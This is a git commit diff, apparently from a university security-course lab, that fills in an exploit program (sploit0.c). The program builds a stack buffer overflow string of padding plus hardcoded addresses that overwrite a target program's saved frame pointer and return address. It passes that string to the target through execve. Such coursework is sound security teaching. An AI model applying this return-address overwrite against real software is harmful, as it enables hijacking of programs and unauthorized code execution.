9e87242ef41a4b6b0d2c54652d7682e0add35f7c
ab <arbeers@wisc.edu>
2023-02-08 15:08:57 -0600

    sp0

--- sploits/sploit0.c
+++ sploits/sploit0.c
@@ -10,7 +10,16 @@ int main(void)
   char *args[3];
   char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  int i;
+  char crack_str[34];
+
+  for(i = 0; i < 25; i++) crack_str[i] = 'A';
+  strcpy(&crack_str[25], "\x40\xf8\xff\xbf"); //overwrite ebp
+  strcpy(&crack_str[29], "\x1d\x85\x04\x08"); //overwrite eip
+
+  args[0] = TARGET; 
+  args[1] = crack_str;
+  args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
